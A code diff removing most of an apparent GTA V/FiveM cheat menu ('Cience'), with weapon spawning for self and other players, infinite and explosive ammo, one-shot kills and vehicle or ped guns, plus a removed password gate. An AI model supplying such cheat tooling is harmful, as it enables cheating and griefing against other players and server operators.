-                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
-                    end
-                end
-                
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("WeaponMenu") then
-                if Cience.MenuButton("∑Single Weapon Spawner", "SingleWeaponMenu") then
-                elseif Cience.ComboBox("Weapon/Melee Damage", { "1x (Default)", "2x", "3x", "4x", "5x" }, currentDamage, selectedDamage, function(currentIndex, selectedIndex)
-                    currentDamage = currentIndex
-                    selectedDamage = selectedIndex
-                end) 
-                then
-                elseif Cience.Button("Give All Weapons") then
-                    for i = 1, #allWeapons do
-                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
-                    end
-                elseif Cience.Button("Remove All Weapons") then
-                    for i = 1, #allWeapons do
-                        RemoveAllPedWeapons(PlayerPedId(), true)
-                    end
-                elseif Cience.Button("Give Ammo") then
-                    for i = 1, #allWeapons do
-                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
-                    end
-                elseif Cience.CheckBox(
-                    "No Reload",
-                    InfClip,
-                    function(enabled)
-                        InfClip = enabled
-                        SetPedInfiniteAmmoClip(PlayerPedId(), InfClip)
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Infinite Ammo",
-                    InfAmmo,
-                    function(enabled)
-                        InfAmmo = enabled
-                        SetPedInfiniteAmmo(PlayerPedId(), InfAmmo)
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Explosive Ammo",
-                    explosiveAmmo,
-                    function(enabled)
-                        explosiveAmmo = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "oneshot", 
-                    Oneshot,
-                    function(enabled)
-                        Oneshot = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Force Gun",
-                    forceGun,
-                    function(enabled)
-                        forceGun = enabled
-                    end)
-                then
-                elseif Cience.CheckBox(
-                    "Delete Gun",
-                    DeleteGun,
-                    function(enabled)
-                        DeleteGun = enabled
-                    end)
-                then
-                elseif Cience.MenuButton("∑Weapon Customization", "WeaponCustomization") then
-                elseif Cience.MenuButton("∑Bullet Gun Options", "BulletGunMenu") then
-                end
-            
-                Cience.Display()
-            elseif Cience.IsMenuOpened("WeaponCustomization") then
-                if Cience.CheckBox(
-                    "Rainbow Tint",
-                    rainbowTint,
-                    function(enabled)
-                        rainbowTint = enabled
-                    end)
-                then
-                elseif Cience.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
-                    currentTint = currentIndex
-                    selectedTint = selectedIndex
-
-                    if selectedTint == 1 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
-                    end
-                    if selectedTint == 2 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
-                    end
-                    if selectedTint == 3 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
-                    end
-                    if selectedTint == 4 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
-                    end
-                    if selectedTint == 5 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
-                    end
-                    if selectedTint == 6 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
-                    end
-                    if selectedTint == 7 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
-                    end
-                    if selectedTint == 8 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
-                    end
-                end)
-                then
-                elseif Cience.Button("~g~Add Special Finish") then
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
-                elseif Cience.Button("~r~Remove Special Finish") then
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
-                elseif Cience.Button("~g~Add Suppressor") then
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
-                elseif Cience.Button("~r~Remove Suppressor") then
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
-                elseif Cience.Button("~g~Add Scope") then
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
-                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
-                elseif Cience.Button("~r~Remove Scope") then
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
-                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
-                end					
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("BulletGunMenu") then
-                if Cience.CheckBox(
-                    "Vehicle Gun",
-                    vehicleGun,
-                    function(enabled)
-                        vehicleGun = enabled
-                    end)
-                then
-                elseif Cience.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
-                    currentVehicle = currentIndex
-                    selectedVehicle = selectedIndex
-
-                end) 
-                then
-                elseif Cience.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
-                    currentVehicleSpeed = currentIndex
-                    selectedVehicleSpeed = selectedIndex
-                end) 
-                then
-                elseif Cience.CheckBox(
-                    "Ped Gun",
-                    pedGun,
-                    function(enabled)
-                        pedGun = enabled
-                end)
-                then
-                elseif Cience.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
-                    currentPed = currentIndex
-                    selectedPed = selectedIndex
-                end)
-                then
-                elseif Cience.CheckBox(
-                    "Bullet Gun",
-                    bulletGun,
-                    function(enabled)
-                        bulletGun = enabled
-                    end)
-                then
-                elseif Cience.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
-                    currentBullet = currentIndex
-                    selectedBullet = selectedIndex
-                    end)
-                then
-                end
-
-
-                
-
-                Cience.Display()
-            elseif Cience.IsMenuOpened("SingleWeaponMenu") then
-                for i = 1, #allWeapons do
-                    if Cience.Button(allWeapons[i]) then
-                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
-                    end
-                end
-            
-            
-        
-                Cience.Display()
-            elseif IsDisabledControlPressed(0, 57) then
-                if logged then
+                elseif IsDisabledControlPressed(0, 314) then
                     Cience.OpenMenu("MainMenu")
-                else
-                    local temp = KeyboardInput("Enter Pass", "", 100)
-                    if temp == pass then
-                        drawNotification("~g~Login Succesful!")
-                        logged = true
-                        Cience.OpenMenu("MainMenu")
-                    else
-                        drawNotification("~r~Login Failed!")
-                    end
                 end
-            end
 
             Citizen.Wait(0)
         end
